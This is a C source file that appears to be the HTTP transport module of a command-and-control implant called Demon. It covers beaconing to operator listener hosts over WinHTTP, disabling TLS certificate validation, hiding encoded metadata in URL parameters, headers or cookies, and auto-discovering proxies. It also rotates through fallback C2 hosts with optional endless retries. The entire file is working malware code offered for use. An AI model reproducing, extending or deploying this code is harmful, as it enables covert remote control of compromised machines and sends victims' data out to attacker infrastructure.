#include <Demon.h>

#include <core/TransportHttp.h>
#include <core/Base64.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_HTTP

/*!
 * @brief
 *  send a http request
 *
 * @param Send
 *  buffer to send
 *
 * @param Resp
 *  buffer response
 *
 * @return
 *  if successful send request
 */
BOOL HttpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    HANDLE  Connect        = { 0 };
    HANDLE  Request        = { 0 };
    LPWSTR  HttpHeader     = { 0 };
    LPWSTR  HttpEndpoint   = { 0 };
    LPWSTR  AllocEndpoint  = { 0 };
    DWORD   HttpFlags      = { 0 };
    LPCWSTR HttpProxy      = { 0 };
    PWSTR   HttpScheme     = { 0 };
    DWORD   Counter        = { 0 };
    DWORD   Iterator       = { 0 };
    DWORD   BufRead        = { 0 };
    UCHAR   Buffer[ 1024 ] = { 0 };
    PVOID   RespBuffer     = { 0 };
    SIZE_T  RespSize       = { 0 };
    BOOL    Successful     = { 0 };
    PVOID   SendBuffer     = { 0 };
    SIZE_T  SendLength     = { 0 };
    PCHAR   MetaEncoded    = { 0 };
    LPWSTR  MetaHeader     = { 0 };

    WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
    WINHTTP_AUTOPROXY_OPTIONS            AutoProxyOptions = { 0 };

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    if ( ! Instance->Config.Transport.Host ) {
        PUTS_DONT_SEND( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( ! Instance->hHttpSession ) {
        if ( Instance->Config.Transport.Proxy.Enabled ) {
            // Use preconfigured proxy
            HttpProxy = Instance->Config.Transport.Proxy.Url;

            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent, HttpProxy ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
        } else {
            // Autodetect proxy settings
            /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
            Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
        }

        if ( ! Instance->hHttpSession ) {
            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
            goto LEAVE;
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
    if ( ! ( Connect = Instance->Win32.WinHttpConnect(
        Instance->hHttpSession,
        Instance->Config.Transport.Host->Host,
        Instance->Config.Transport.Host->Port,
        0
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    while ( TRUE ) {
        if ( ! Instance->Config.Transport.Uris[ Counter ] ) {
            break;
        } else {
            Counter++;
        }
    }

    HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    /* save original send buffer; we may advance past metadata */
    SendBuffer = Send->Buffer;
    SendLength = Send->Length;

    /* if using query parameter location, append ?Name=base64(metadata) to URI */
    PRINTF_DONT_SEND( "DataReq.Location=%d Name=%ls SendLength=%zu\n",
        Instance->Config.Transport.DataReq.Location,
        Instance->Config.Transport.DataReq.Name ? Instance->Config.Transport.DataReq.Name : L"(null)",
        SendLength )

    if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_PARAM &&
         Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE )
    {
        SIZE_T  EncLen    = 0;
        SIZE_T  NameLen   = 0;
        SIZE_T  UriLen    = 0;
        WCHAR   WideTok[ 32 ] = { 0 };

        PRINTF_DONT_SEND( "PARAM path: encoding %d bytes of metadata\n", METADATA_SIZE )

        MetaEncoded = Base64UrlEncode( SendBuffer, METADATA_SIZE, &EncLen );
        if ( MetaEncoded )
        {
            PRINTF_DONT_SEND( "Base64UrlEncode ok, EncLen=%zu encoded=%s\n", EncLen, MetaEncoded )
            CharStringToWCharString( WideTok, MetaEncoded, 31 );
            Instance->Win32.LocalFree( MetaEncoded );
            MetaEncoded = NULL;

            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
            UriLen  = StringLengthW( HttpEndpoint );

            /* "uri?name=token\0" */
            AllocEndpoint = Instance->Win32.LocalAlloc( LPTR,
                ( UriLen + 1 + NameLen + 1 + EncLen + 1 ) * sizeof( WCHAR ) );
            if ( AllocEndpoint )
            {
                Instance->Win32.swprintf_s( AllocEndpoint,
                    UriLen + 1 + NameLen + 1 + EncLen + 1,
                    L"%ls?%ls=%ls", HttpEndpoint, Instance->Config.Transport.DataReq.Name, WideTok );
                HttpEndpoint = AllocEndpoint;
                PRINTF_DONT_SEND( "Built URL: %ls\n", HttpEndpoint )
            }

            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
            SendLength -= METADATA_SIZE;
            PRINTF_DONT_SEND( "Adjusted SendLength=%zu\n", SendLength )
        }
        else
        {
            PUTS_DONT_SEND( "Base64UrlEncode FAILED" )
        }
    }

    /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
        Connect,
        Instance->Config.Transport.Method,
        HttpEndpoint,
        NULL,
        NULL,
        NULL,
        HttpFlags
    ) ) ) {
        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
        goto LEAVE;
    }

    if ( Instance->Config.Transport.Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    do {
        HttpHeader = Instance->Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        if ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
        }

        Iterator++;
    } while ( TRUE );

    /* inject metadata into header or cookie if configured */
    if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_HEADER &&
         Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE &&
         SendBuffer == Send->Buffer /* not already extracted by PARAM path */ )
    {
        SIZE_T EncLen  = 0;
        SIZE_T NameLen = 0;
        WCHAR  WideTok[ 32 ] = { 0 };

        MetaEncoded = Base64Encode( SendBuffer, METADATA_SIZE, &EncLen );
        if ( MetaEncoded )
        {
            CharStringToWCharString( WideTok, MetaEncoded, 31 );
            Instance->Win32.LocalFree( MetaEncoded );
            MetaEncoded = NULL;

            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
            /* "Name: token\r\n\0" */
            MetaHeader = Instance->Win32.LocalAlloc( LPTR,
                ( NameLen + 2 + EncLen + 3 ) * sizeof( WCHAR ) );
            if ( MetaHeader )
            {
                Instance->Win32.swprintf_s( MetaHeader, NameLen + 2 + EncLen + 3,
                    L"%ls: %ls\r\n", Instance->Config.Transport.DataReq.Name, WideTok );
                Instance->Win32.WinHttpAddRequestHeaders( Request, MetaHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );
                Instance->Win32.LocalFree( MetaHeader );
                MetaHeader = NULL;
            }

            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
            SendLength -= METADATA_SIZE;
        }
    }
    else if ( Instance->Config.Transport.DataReq.Location == PAYLOAD_LOC_COOKIE &&
              Instance->Config.Transport.DataReq.Name && SendBuffer && SendLength >= METADATA_SIZE &&
              SendBuffer == Send->Buffer )
    {
        SIZE_T EncLen  = 0;
        SIZE_T NameLen = 0;
        WCHAR  WideTok[ 32 ] = { 0 };

        MetaEncoded = Base64Encode( SendBuffer, METADATA_SIZE, &EncLen );
        if ( MetaEncoded )
        {
            CharStringToWCharString( WideTok, MetaEncoded, 31 );
            Instance->Win32.LocalFree( MetaEncoded );
            MetaEncoded = NULL;

            NameLen = StringLengthW( Instance->Config.Transport.DataReq.Name );
            /* "Cookie: Name=token\r\n\0" */
            MetaHeader = Instance->Win32.LocalAlloc( LPTR,
                ( 8 + NameLen + 1 + EncLen + 3 ) * sizeof( WCHAR ) );
            if ( MetaHeader )
            {
                Instance->Win32.swprintf_s( MetaHeader, 8 + NameLen + 1 + EncLen + 3,
                    L"Cookie: %ls=%ls\r\n", Instance->Config.Transport.DataReq.Name, WideTok );
                Instance->Win32.WinHttpAddRequestHeaders( Request, MetaHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );
                Instance->Win32.LocalFree( MetaHeader );
                MetaHeader = NULL;
            }

            SendBuffer = (PBYTE) SendBuffer + METADATA_SIZE;
            SendLength -= METADATA_SIZE;
        }
    }

    if ( Instance->Config.Transport.Proxy.Enabled ) {

        // Use preconfigured proxy
        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance->Config.Transport.Proxy.Url;

        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance->Config.Transport.Proxy.Username ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_USERNAME,
                Instance->Config.Transport.Proxy.Username,
                StringLengthW( Instance->Config.Transport.Proxy.Username )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance->Config.Transport.Proxy.Password ) {
            if ( ! Instance->Win32.WinHttpSetOption(
                Request,
                WINHTTP_OPTION_PROXY_PASSWORD,
                Instance->Config.Transport.Proxy.Password,
                StringLengthW( Instance->Config.Transport.Proxy.Password )
            ) ) {
                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
            }
        }

    } else if ( ! Instance->LookedForProxy ) {
        // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol

        /*
         * NOTE: We use WinHttpGetProxyForUrl as the first option because
         *       WinHttpGetIEProxyConfigForCurrentUser can fail with certain users
         *       and also the documentation states that WinHttpGetIEProxyConfigForCurrentUser
         *       "can be used as a fall-back mechanism" so we are using it that way
         */

        AutoProxyOptions.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
        AutoProxyOptions.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
        AutoProxyOptions.lpszAutoConfigUrl      = NULL;
        AutoProxyOptions.lpvReserved            = NULL;
        AutoProxyOptions.dwReserved             = 0;
        AutoProxyOptions.fAutoLogonIfChallenged = TRUE;

        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
            if ( ProxyInfo.lpszProxy ) {
                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
            }

            Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
            Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
            MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
        } else {
            // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                    // IE is set to "use a proxy server"
                    ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                    ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                    ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;

                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );

                    Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                    Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                    MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );

                    // don't cleanup these values
                    ProxyConfig.lpszProxy       = NULL;
                    ProxyConfig.lpszProxyBypass = NULL;
                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                    // IE is set to "Use automatic proxy configuration"
                    AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                    AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                    AutoProxyOptions.dwAutoDetectFlags = 0;

                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );

                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
                        if ( ProxyInfo.lpszProxy ) {
                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
                        }

                        Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                        Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                        MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                    }
                } else {
                    // IE is set to "automatically detect settings"
                    // ignore this as we already tried
                }
            }
        }

        Instance->LookedForProxy = TRUE;
    }

    if ( Instance->ProxyForUrl ) {
        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Send package to our listener */
    PRINTF_DONT_SEND( "WinHttpSendRequest: Method=%ls Endpoint=%ls SendLength=%zu Secure=%d\n",
        Instance->Config.Transport.Method, HttpEndpoint, SendLength, Instance->Config.Transport.Secure )

    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0,
         SendLength > 0 ? SendBuffer : NULL, SendLength, SendLength, 0 ) )
    {
        if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
            /* Is the server recognizing us ? are we good ?  */
            DWORD _StatusCode = HttpQueryStatus( Request );
            if ( _StatusCode != HTTP_STATUS_OK ) {
                PRINTF_DONT_SEND( "HttpQueryStatus Failed: got %d, expected 200\n", _StatusCode )
                Successful = FALSE;
                goto LEAVE;
            }

            if ( Resp ) {
                PBYTE  RespMeta     = NULL;
                SIZE_T RespMetaSize = 0;

                PRINTF_DONT_SEND( "Response: DataResp.Location=%d Name=%ls\n",
                    Instance->Config.Transport.DataResp.Location,
                    Instance->Config.Transport.DataResp.Name ? Instance->Config.Transport.DataResp.Name : L"(null)" )

                /* extract response metadata from header if configured (PARAM falls back to header) */
                if ( ( Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_HEADER ||
                       Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_PARAM ) &&
                     Instance->Config.Transport.DataResp.Name )
                {
                    WCHAR  HdrBuf[ 128 ] = { 0 };
                    DWORD  HdrSize       = sizeof( HdrBuf );
                    CHAR   NarrowHdr[ 64 ] = { 0 };

                    BOOL hdrOk = Instance->Win32.WinHttpQueryHeaders( Request,
                         WINHTTP_QUERY_CUSTOM, Instance->Config.Transport.DataResp.Name,
                         HdrBuf, &HdrSize, WINHTTP_NO_HEADER_INDEX );
                    PRINTF_DONT_SEND( "WinHttpQueryHeaders(%ls): %s (err=%d)\n",
                        Instance->Config.Transport.DataResp.Name,
                        hdrOk ? "OK" : "FAILED", NtGetLastError() )

                    if ( hdrOk )
                    {
                        SIZE_T i = 0;
                        for ( ; i < HdrSize / sizeof( WCHAR ) && i < 63; i++ )
                            NarrowHdr[ i ] = (CHAR) HdrBuf[ i ];
                        NarrowHdr[ i ] = '\0';

                        PRINTF_DONT_SEND( "Response header value: %s (len=%zu)\n", NarrowHdr, i )
                        RespMeta = Base64Decode( NarrowHdr, i, &RespMetaSize );
                        PRINTF_DONT_SEND( "Base64Decode: RespMetaSize=%zu\n", RespMetaSize )
                    }
                }
                else if ( Instance->Config.Transport.DataResp.Location == PAYLOAD_LOC_COOKIE &&
                          Instance->Config.Transport.DataResp.Name )
                {
                    WCHAR  HdrBuf[ 512 ] = { 0 };
                    DWORD  HdrSize       = sizeof( HdrBuf );
                    CHAR   NarrowHdr[ 256 ] = { 0 };

                    if ( Instance->Win32.WinHttpQueryHeaders( Request,
                         WINHTTP_QUERY_SET_COOKIE, WINHTTP_HEADER_NAME_BY_INDEX,
                         HdrBuf, &HdrSize, WINHTTP_NO_HEADER_INDEX ) )
                    {
                        SIZE_T i = 0;
                        for ( ; i < HdrSize / sizeof( WCHAR ) && i < 255; i++ )
                            NarrowHdr[ i ] = (CHAR) HdrBuf[ i ];
                        NarrowHdr[ i ] = '\0';

                        /* find "Name=" in cookie string */
                        CHAR   SearchName[ 128 ] = { 0 };
                        SIZE_T NameLen = StringLengthW( Instance->Config.Transport.DataResp.Name );
                        SIZE_T j = 0;
                        for ( ; j < NameLen && j < 126; j++ )
                            SearchName[ j ] = (CHAR) Instance->Config.Transport.DataResp.Name[ j ];
                        SearchName[ j ] = '=';
                        SearchName[ j + 1 ] = '\0';

                        PCHAR Found = NULL;
                        for ( SIZE_T k = 0; k < i; k++ )
                        {
                            BOOL Match = TRUE;
                            for ( SIZE_T m = 0; SearchName[ m ]; m++ )
                            {
                                if ( k + m >= i || NarrowHdr[ k + m ] != SearchName[ m ] )
                                { Match = FALSE; break; }
                            }
                            if ( Match ) { Found = &NarrowHdr[ k + j + 1 ]; break; }
                        }

                        if ( Found )
                        {
                            SIZE_T ValLen = 0;
                            while ( Found[ ValLen ] && Found[ ValLen ] != ';' && Found[ ValLen ] != ' ' )
                                ValLen++;
                            RespMeta = Base64Decode( Found, ValLen, &RespMetaSize );
                        }
                    }
                }

                RespBuffer = NULL;
                RespSize   = 0;

                /* if we extracted metadata from a header, prepend it */
                if ( RespMeta && RespMetaSize > 0 )
                {
                    RespBuffer = Instance->Win32.LocalAlloc( LPTR, RespMetaSize );
                    MemCopy( RespBuffer, RespMeta, RespMetaSize );
                    RespSize = RespMetaSize;
                    Instance->Win32.LocalFree( RespMeta );
                    RespMeta = NULL;
                }

                /* read the body (bulk payload) */
                do {
                    Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
                    if ( ! Successful || BufRead == 0 ) {
                        break;
                    }

                    if ( ! RespBuffer ) {
                        RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
                    } else {
                        RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                    }

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, sizeof( Buffer ) );
                } while ( Successful == TRUE );

                Resp->Length = RespSize;
                Resp->Buffer = RespBuffer;

                PRINTF_DONT_SEND( "Response total: RespSize=%zu (meta=%zu + body)\n", RespSize, RespMetaSize )
                Successful = TRUE;
            }
        }
    } else {
        if ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
            Instance->Session.Connected = FALSE;
        }

        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
    }

LEAVE:
    if ( AllocEndpoint ) {
        Instance->Win32.LocalFree( AllocEndpoint );
        AllocEndpoint = NULL;
    }

    if ( MetaEncoded ) {
        Instance->Win32.LocalFree( MetaEncoded );
        MetaEncoded = NULL;
    }

    if ( Connect ) {
        Instance->Win32.WinHttpCloseHandle( Connect );
    }

    if ( Request ) {
        Instance->Win32.WinHttpCloseHandle( Request );
    }

    if ( ProxyConfig.lpszProxy ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxy );
    }

    if ( ProxyConfig.lpszProxyBypass ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
    }

    if ( ProxyConfig.lpszAutoConfigUrl ) {
        Instance->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
    }

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful ) {
        /* if we hit our max then we use our next host */
        Instance->Config.Transport.Host = HostFailure( Instance->Config.Transport.Host );
    }

    return Successful;
}

/*!
 * @brief
 *  Query the Http Status code from the request response.
 *
 * @param hRequest
 *  request handle
 *
 * @return
 *  Http status code
 */
DWORD HttpQueryStatus(
    _In_ HANDLE Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance->Win32.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &StatusCode,
        &StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd(
    _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = MmHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = MmHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance->Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance->Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance->Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance->Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF_DONT_SEND( "Index: %d\n", Index )
    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( Instance->Config.Transport.NumHosts > 1 )
    {
        /*
         * Different CDNs can have different WPAD rules.
         * After rotating, look for the proxy again
         */
        Instance->LookedForProxy = FALSE;
    }

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! Instance->Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an empty pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = Instance->Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance->Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance->Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif
